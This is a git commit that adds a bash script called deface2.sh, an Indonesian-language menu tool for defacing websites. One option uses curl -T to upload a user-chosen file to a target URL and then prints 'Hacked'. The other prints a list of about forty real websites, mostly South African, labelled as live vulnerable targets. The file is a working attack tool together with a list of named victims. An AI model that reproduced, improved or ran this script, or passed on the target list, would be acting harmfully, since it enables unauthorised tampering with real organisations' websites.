a18544e3c1366426fe0f4e6418a186c035fa7aab
Mr.R0N1Z <50039352+Mr-R0N1Z@users.noreply.github.com>
2019-07-08 21:15:56 +0700

    Add files via upload
    Deface 2 is for pentestbox user

---
+++ deface2.sh
@@ -0,0 +1,100 @@
+#usr/bin/bash
+clear
+echo ':::::::::  :::::::::: ::::::::::     :::      ::::::::  :::::::::: 
+:+:    :+: :+:        :+:          :+: :+:   :+:    :+: :+:        
++:+    +:+ +:+        +:+         +:+   +:+  +:+        +:+        
++#+    +:+ +#++:++#   :#::+::#   +#++:++#++: +#+        +#++:++#   
++#+    +#+ +#+        +#+        +#+     +#+ +#+        +#+        
+#+#    #+# #+#        #+#        #+#     #+# #+#    #+# #+#        
+#########  ########## ###        ###     ###  ########  ########## 
+'
+echo
+echo '(Deface Tebas Index)'
+echo
+echo '------------------------------------------------'
+echo 'Instagram: @ronis_punya_ig'
+echo '------------------------------------------------'
+echo
+echo 'Jadilah Defacer Sejati'
+echo
+echo '-------------------------------'
+echo '[A] MULAI DEFACE'
+echo '[B] WEBSITE VULN'
+echo '-------------------------------'
+echo
+read -p "[PILIH]:~# "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo "Simpan SC Di Memory Internal Di Luar Folder "
+echo
+echo
+read -p "[WEB TARGET]:~# "  target
+echo
+echo "Masukan Script!!! "
+echo
+read -p "[SCRIPT]:~# "  script
+curl -T /storage/emulated/0/$script $target
+echo "[Hacked]"～～～＞" $target"
+echo
+echo '[KEMBALI TEKAN TOMBOL ENTER]'
+echo
+read -p '[BACK]' asu
+clear
+sh deface2.sh
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo
+echo "Live Target"
+echo "http://contsol.co.za"
+echo "http://colourfactory.co.za"
+echo "http://chillibitez.co.za"
+echo "http://chasingfantasia.com"
+echo "http://centraltech.co.za"
+echo "http://cblandscapes.co.za"
+echo "http://crimsonmonkeyweb.com"
+echo "http://kevinbutho.com"
+echo "http://prorepafrica.com"
+echo "http://xposurephotography.co.za"
+echo "http://windmillsandporcupines.co.za"
+echo "http://tcnig.co.za"
+echo "http://techdirect.co.za"
+echo "http://thehellenic.co.za"
+echo "http://valdicare.co.za"
+echo "http://africaprop.co.za"
+echo "http://www.alfunctiondesigns.co.za"
+echo "http://athenaeum.co.za"
+echo "http://geotrac.co.za"
+echo "http://www.compu7.co.za"
+echo "http://enetics.co.za"
+echo "http://ballastbrokers.co.za"
+echo "http://www.ajaxfilebrowser.com"
+echo "http://enetics.co.za"
+echo "http://electrogem.co.za"
+echo "http://sorgatz.ch"
+echo "http://shls001.com"
+echo "http://www.learn-mt.com"
+echo "http://braziliansandalco.co.za"
+echo "http://bestilling.udir.no"
+echo "http://wop.zayhi.com"
+echo "http://troop-1539.org"
+echo "http://www.ratiss.org"
+echo "http://office.ratiss.org"
+echo "http://apparelworld.org"
+echo "http://branch.prospec.co.th"
+echo "http://branch.prospec.co.th"
+echo "http://expertads.co.za"
+echo "http://annettemuller.co.za"
+echo "http://hq.prospec.co.th"
+echo "http://branch.prospec.co.th"
+echo "http://bestilling.udir.no"
+echo "http://cos.co.za"
+echo
+echo '[KEMBALI TEKAN TOMBOL ENTER]'
+echo
+read -p '[BACK]' asu
+clear
+sh deface2.sh
+fi
